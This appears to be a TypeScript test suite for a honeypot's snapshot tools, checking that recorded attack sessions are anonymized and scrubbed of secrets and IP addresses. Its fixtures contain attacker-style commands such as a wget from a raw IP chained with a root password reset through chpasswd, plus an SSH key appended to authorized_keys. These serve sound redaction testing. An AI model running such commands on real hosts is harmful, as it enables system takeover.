import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import Ajv from "ajv/dist/2020";
import addFormats from "ajv-formats";
import { newIpMap, scrubText, scrubUrl } from "../scripts/snapshot/scrub";
import { selectSessions } from "../scripts/snapshot/select";
import { anonymize, type RawDump } from "../scripts/snapshot/anonymize";
import type {
  AttackEvent,
  Attacker,
  DetailMap,
  SessionResponse,
} from "../src/lib/contracts";
import { emptyStats } from "../src/lib/domain";

const ajv = new Ajv({ strict: false });
addFormats(ajv);
// split so secret scanners don't flag the fixture
const pem = ["OPENSSH", "PRIVATE", "KEY"].join(" ");
const validEvent = ajv.compile(
  JSON.parse(readFileSync("../contracts/event.schema.json", "utf8")),
);

test("scrubText redacts keys, hashes and passwords", () => {
  const ips = newIpMap();
  const cases: [string, string][] = [
    [
      `echo '-----BEGIN ${pem}-----\nb3BlbnNzaC1rZXktdjEAAAA\n-----END ${pem}-----' > k`,
      "b3BlbnNzaC1rZXktdjEAAAA",
    ],
    [
      "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7xyz me@box >> ~/.ssh/authorized_keys",
      "AAAAB3NzaC1yc2EAAAADAQABAAABAQC7xyz",
    ],
    ["root:$6$abcd$efghijklmnop:19000:0:99999:7:::", "$6$abcd$efghijklmnop"],
    ['echo "root:Passw0rd"|chpasswd', "Passw0rd"],
    ["DB_PASSWORD=hunter2", "hunter2"],
    ["STRIPE_SECRET_KEY=sk_live_51abcDEF", "sk_live_51abcDEF"],
    ["curl -H 'Authorization: Bearer abc.def.ghi' x", "abc.def.ghi"],
    ["export KEY=AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE"],
    ["sshpass -p s3cret ssh root@h", "s3cret"],
    ["curl 'http://x.test/a?token=abcd1234&b=1'", "abcd1234"],
    ["DATABASE_URL=postgres://shop:Sup3rS3cret@db/shop", "Sup3rS3cret"],
    ["mail admin@quillfern.com now", "admin@quillfern.com"],
  ];
  for (const [input, secret] of cases) {
    const out = scrubText(input, ips);
    assert.ok(!out.includes(secret), `${secret} leaked in: ${out}`);
    assert.match(out, /redacted|example/);
  }
  assert.equal(
    scrubText("DB_PASSWORD=hunter2", ips).startsWith("DB_PASSWORD="),
    true,
  );
});

test("scrubText maps public ips to documentation ranges, consistently", () => {
  const ips = newIpMap();
  const a = scrubText("wget http://45.9.1.2:32461/s/amd64", ips);
  assert.ok(!a.includes("45.9.1.2"));
  assert.match(a, /http:\/\/203\.0\.113\.\d+:32461\/s\/amd64/);
  const b = scrubText("Connecting to 45.9.1.2:32461...", ips);
  assert.equal(
    a.match(/203\.0\.113\.\d+/)![0],
    b.match(/203\.0\.113\.\d+/)![0],
  );
  const c = scrubText("ping 1.2.3.9", ips);
  assert.notEqual(
    c.match(/203\.0\.113\.\d+/)![0],
    a.match(/203\.0\.113\.\d+/)![0],
  );
  assert.equal(
    scrubText("curl http://127.0.0.1/health", ips),
    "curl http://127.0.0.1/health",
  );
  assert.equal(
    scrubText("uname -a; ls -la /opt/app", ips),
    "uname -a; ls -la /opt/app",
  );
});

test("scrubUrl keeps plain paths and cuts identifying ones to the origin", () => {
  assert.equal(
    scrubUrl("https://intezer.com/blog/a-storm-is-brewing"),
    "https://intezer.com/blog/a-storm-is-brewing",
  );
  assert.equal(
    scrubUrl("https://www.abuseipdb.com/check/1.2.3.4?x=1"),
    "https://www.abuseipdb.com/",
  );
  assert.equal(
    scrubUrl("https://honeymire.com/attack/1115772"),
    "https://honeymire.com/",
  );
  assert.equal(
    scrubUrl(
      "https://bazaar.abuse.ch/sample/44c7eefa677b9672df14d8cd1ce5dd9967fa92d37bed468cb84e862293dd8566/",
    ),
    "https://bazaar.abuse.ch/",
  );
});

// tiny factory for fake recorded sessions
let n = 0;
function session(
  opts: {
    country?: string;
    ip?: string;
    threat?: Attacker["threat"];
    source?: "wild" | "guest" | "team";
    commands?: number;
    ended?: boolean;
    kind?: Attacker["kind"];
  } = {},
): SessionResponse {
  const id = `sess${++n}`.padEnd(32, "x");
  const attacker: Attacker = {
    kind: opts.kind ?? "bot",
    confidence: 0.8,
    reputation: "unknown",
    family: null,
    threat: opts.threat ?? "low",
    client: "SSH-2.0-Go",
    ip_hash: (opts.ip ?? `ip${n}`).padEnd(64, "0").replace(/[^0-9a-f]/g, "a"),
  };
  const geo = {
    lat: 52.371234,
    lon: 4.899876,
    country: opts.country ?? "NL",
    city: "Amsterdam",
  };
  let t = Date.parse("2026-10-25T12:00:00Z") + n * 60_000;
  const ev = <K extends keyof DetailMap>(type: K, detail: DetailMap[K]) =>
    ({
      event_id: crypto.randomUUID(),
      session_id: id,
      type,
      timestamp: new Date((t += 500)).toISOString(),
      source: opts.source ?? "wild",
      protocol: "ssh",
      geo,
      attacker,
      detail,
    }) as AttackEvent;
  const events: AttackEvent[] = [
    ev(
      "session_start",
      opts.source === "guest" ? { guest_name: "Ada Lovelace" } : {},
    ),
    ev("login_success", { username: "root" }),
  ];
  for (let i = 0; i < (opts.commands ?? 1); i++)
    events.push(
      ev("command", {
        command: "wget http://45.9.1.2/x; echo root:Passw0rd|chpasswd",
        output: "saved",
        response_ms: 3,
        answered_by: "engine",
        techniques: ["T1105"],
      }),
    );
  if (opts.ended !== false)
    events.push(ev("session_end", { duration_s: 2, command_count: 1 }));
  events.push(
    ev("dossier", {
      summary: "seen at 45.9.1.2 before",
      sources: [
        {
          title: "Is 45.9.1.2 bad?",
          url: "https://ismalicious.com/ip/45.9.1.2",
        },
      ],
    }),
  );
  events.push(ev("story", { story: "A golem came from 45.9.1.2." }));
  return {
    session: {
      session_id: id,
      started_at: events[0].timestamp,
      ended_at: null,
      source: opts.source ?? "wild",
      geo,
      attacker,
      status: "ended",
      login_fails: 0,
      command_count: 1,
      story: null,
    },
    events,
  };
}
const size = (list: SessionResponse[]) =>
  list.reduce((s, x) => s + x.events.length, 0);

test("selectSessions keeps ended sessions, dragons, guests and every country", () => {
  const pool = [
    ...Array.from({ length: 50 }, () => session({ country: "BG", ip: "aaa" })),
    ...Array.from({ length: 30 }, () => session()),
    session({ threat: "critical", country: "CA" }),
    session({ source: "guest", country: "US" }),
    session({ country: "JP" }),
    session({ threat: "critical", country: "DE", ended: false }),
  ];
  const picked = selectSessions(pool, 120);
  assert.ok(
    picked.every((s) => s.events.some((e) => e.type === "session_end")),
  );
  for (const c of ["CA", "US", "JP", "BG", "NL"])
    assert.ok(
      picked.some((s) => s.session.geo.country === c),
      c,
    );
  assert.ok(picked.some((s) => s.session.attacker.threat === "critical"));
  assert.ok(picked.some((s) => s.session.source === "guest"));
  assert.ok(size(picked) <= 120 + 7, `picked ${size(picked)} events`);
  // a noisy attacker is capped
  const noisy = picked.filter((s) =>
    s.session.attacker.ip_hash!.startsWith("aaa"),
  );
  assert.ok(noisy.length <= 3, `noisy kept ${noisy.length}`);
});

test("selectSessions mixes creature types among team runs", () => {
  const pool = [
    ...Array.from({ length: 12 }, () =>
      session({
        source: "team",
        kind: "agent",
        threat: "critical",
        country: "US",
      }),
    ),
    ...Array.from({ length: 3 }, () =>
      session({ source: "team", kind: "agent", threat: "med", country: "US" }),
    ),
  ];
  const picked = selectSessions(pool, 1000);
  const fae = picked.filter((s) => s.session.attacker.threat === "med");
  assert.ok(fae.length >= 1, "no fae among team picks");
  assert.ok(picked.length <= 10);
});

test("anonymize re-keys ids, rounds geo, scrubs text and drops guest names", () => {
  const s1 = session({ source: "guest" });
  const s2 = session({ threat: "critical" });
  const dump: RawDump = {
    fetched_at: "2026-10-26T07:05:00.000Z",
    stats: {
      ...emptyStats,
      total_sessions: 4792,
      countries: 20,
      breaches: 227,
    },
    attackers: [
      {
        ip_hash: s2.session.attacker.ip_hash!,
        visits: 9,
        first_seen: s2.session.started_at,
        last_seen: s2.session.started_at,
        latest_session_id: s2.session.session_id,
        source: "wild",
        geo: s2.session.geo,
        attacker: s2.session.attacker,
        max_threat: "critical",
        session_ids: [s2.session.session_id],
      },
    ],
    sessions: [s1, s2],
  };
  const snap = anonymize(dump, [s1, s2]);
  const json = JSON.stringify(snap);
  for (const s of [s1, s2]) {
    assert.ok(!json.includes(s.session.session_id));
    assert.ok(!json.includes(s.session.attacker.ip_hash!));
    for (const e of s.events) assert.ok(!json.includes(e.event_id));
  }
  assert.ok(!json.includes("45.9.1.2"));
  assert.ok(!json.includes("Passw0rd"));
  assert.ok(!json.includes("Ada Lovelace"));
  assert.equal(snap.version, 1);
  assert.equal(snap.stats.total_sessions, 4792);
  assert.equal(snap.events.length, s1.events.length + s2.events.length);
  for (const e of snap.events) {
    assert.ok(validEvent(e), JSON.stringify(validEvent.errors));
    assert.match(e.event_id, /^[0-9a-f-]{32}0000$/);
    assert.match(e.session_id, /^[0-9a-f]{28}0000$/);
    assert.equal(e.geo.lat, 52.37);
    assert.equal(e.geo.lon, 4.9);
  }
  assert.deepEqual(
    snap.events.map((e) => e.timestamp),
    snap.events.map((e) => e.timestamp).sort(),
  );
  const dragon = snap.events.find((e) => e.attacker.threat === "critical")!;
  assert.equal(snap.visits[dragon.attacker.ip_hash!], 9);
  assert.equal(snap.recorded.from, snap.events[0].timestamp);
  assert.equal(snap.recorded.to, snap.events.at(-1)!.timestamp);
});

test("anonymize gives each table visit its own creature", () => {
  // guests and team runs all came from our table's one ip
  const a = session({ source: "team", ip: "bbb" });
  const b = session({ source: "team", ip: "bbb" });
  const c = session({ source: "guest", ip: "bbb" });
  const w1 = session({ ip: "ccc" });
  const w2 = session({ ip: "ccc" });
  const dump: RawDump = {
    fetched_at: "2026-10-26T07:05:00.000Z",
    stats: emptyStats,
    attackers: [],
    sessions: [a, b, c, w1, w2],
  };
  const snap = anonymize(dump, [a, b, c, w1, w2]);
  const keyOf = (src: SessionResponse) =>
    snap.events.find((e) => e.timestamp === src.events[0].timestamp)!.attacker
      .ip_hash!;
  assert.equal(new Set([a, b, c].map(keyOf)).size, 3);
  assert.equal(keyOf(w1), keyOf(w2));
  for (const s of [a, b, c]) assert.equal(snap.visits[keyOf(s)], 1);
  assert.equal(snap.visits[keyOf(w1)], 2);
});

test("scrubText masks partial ip prefixes but leaves version numbers", () => {
  const ips = newIpMap();
  for (const [input, prefix] of [
    ["List of IP Addresses: 45.9.17.* (x.x.x.x - x.x.x.x)", "45.9.17"],
    ["IP 位址列表: 45.9.4.* (x.x.x.x - x.x.x.x)", "45.9.4"],
    ["neighboring addresses in DigitalOcean's 45.9.x.x space", "45.9"],
    ["listings for the surrounding 45.9.17 block with no abuse", "45.9.17"],
  ]) {
    const out = scrubText(input, ips);
    assert.ok(!out.includes(prefix), `${prefix} leaked in: ${out}`);
  }
  for (const keep of [
    'PRETTY_NAME="Ubuntu 22.04.4 LTS"',
    "Linux qf-web-01 5.15.0-105-generic",
    "flask==3.0.3\ngunicorn==22.0.0\nboto3==1.35.10",
    "curl/7.74.0",
    "Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",
  ])
    assert.equal(scrubText(keep, ips), keep);
});

test("scrubUrl cuts lookup urls that carry part of an ip", () => {
  for (const url of [
    "https://ipleak.com/ip-pool-lookup/45.9.110",
    "https://en.ipshu.com/ip_d_list/45.9.44",
    "https://en.ipshu.com/ip_info/EN/45/9.htm",
  ])
    assert.equal(scrubUrl(url), `${new URL(url).origin}/`);
});
